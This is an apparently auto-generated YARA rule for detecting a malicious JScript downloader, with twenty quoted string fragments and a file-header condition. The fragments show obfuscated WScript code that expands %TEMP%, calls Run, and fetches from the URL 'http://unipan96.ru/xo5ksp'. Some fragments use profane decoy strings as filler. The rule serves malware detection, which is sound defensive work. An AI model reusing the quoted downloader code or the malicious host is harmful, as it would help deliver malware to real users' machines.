rule sig_20160428_8770ca30cf31087fbaab480091dd36b1 {
  meta:
    description = "datamaliciousorder - file 20160428_8770ca30cf31087fbaab480091dd36b1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1274cfab74688c8aab205cff8063ed67facacb2262bae86830857b6d9e50e72d"

  strings:
    $s1  = "function AjfVyiTmeZjjOryNvjAgf(NolZnaEznTghYgfEvcLgw){DcrFkdPvhIwpNrzLscCwl[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function XsoWarHdwLbqRlrJxnNfz() {return DcrFkdPvhIwpNrzLscCwl[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function AjfVyiTmeZjjOryNvjAgf(NolZnaEznTghYgfEvcLgw){DcrFkdPvhIwpNrzLscCwl[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var DcrFkdPvhIwpNrzLscCwl = function IdkDzzTheMviFhyKhbAqr() {return RevXcmFirKihVesYzoVpu[HwuArbOmmVneRzsAilNyx](\"WScript\"+\"" ascii
    $s5  = "return KmhAmrDudBmbVhdFprVcc - EzbFzyYfmXavUhaSkyOgo;};" fullword ascii
    $s6  = "function XnrPgcLhcRadTieQbeBcv(KmhAmrDudBmbVhdFprVcc, EzbFzyYfmXavUhaSkyOgo){RgnUxmEjkCcyCtwAxdIxz = RgnUxmEjkCcyCtwAxdIxz * 1; " ascii
    $s7  = "MuiZbbCflWewZslYbzJbw[LaqZaoDsiBrtGanAzpHxt](\"G\" + \"ET\", \"http://unipan96.ru/xo5ksp\", false);" fullword ascii
    $s8  = "var RevXcmFirKihVesYzoVpu = this[\"WScript\"];" fullword ascii
    $s9  = "var DcrFkdPvhIwpNrzLscCwl = function IdkDzzTheMviFhyKhbAqr() {return RevXcmFirKihVesYzoVpu[HwuArbOmmVneRzsAilNyx](\"WScript\"+\"" ascii
    $s10 = "function XsoWarHdwLbqRlrJxnNfz() {return DcrFkdPvhIwpNrzLscCwl[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function XnrPgcLhcRadTieQbeBcv(KmhAmrDudBmbVhdFprVcc, EzbFzyYfmXavUhaSkyOgo){RgnUxmEjkCcyCtwAxdIxz = RgnUxmEjkCcyCtwAxdIxz * 1; " ascii
    $s12 = "if (MuiZbbCflWewZslYbzJbw[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function IwiNumNhjHutSbpVsuKdq(){return QgfZnxMxxXjtLpgBdwTti + \"\";};" fullword ascii
    $s14 = "function HmzTpfEfkEtrIqrWmqTev() {return ((OhxSpoOpoNqqCjkLtwGhm == true) && (OhxSpoOpoNqqCjkLtwGhm == BarEepBiaMtbHdxNcqAjv)) ?" ascii
    $s15 = "function HmzTpfEfkEtrIqrWmqTev() {return ((OhxSpoOpoNqqCjkLtwGhm == true) && (OhxSpoOpoNqqCjkLtwGhm == BarEepBiaMtbHdxNcqAjv)) ?" ascii
    $s16 = "function TozHjpBfgDcpIxtZbtWrm(){return 23;};" fullword ascii
    $s17 = "var AwzZsaSmyPqhMlkCveHmb = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "var VyqMfiTjrCbhDjkQmjIuk = false;" fullword ascii
    $s19 = "function CjgDvsItrNbrLjrFgtChk()" fullword ascii
    $s20 = "var OhxSpoOpoNqqCjkLtwGhm = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}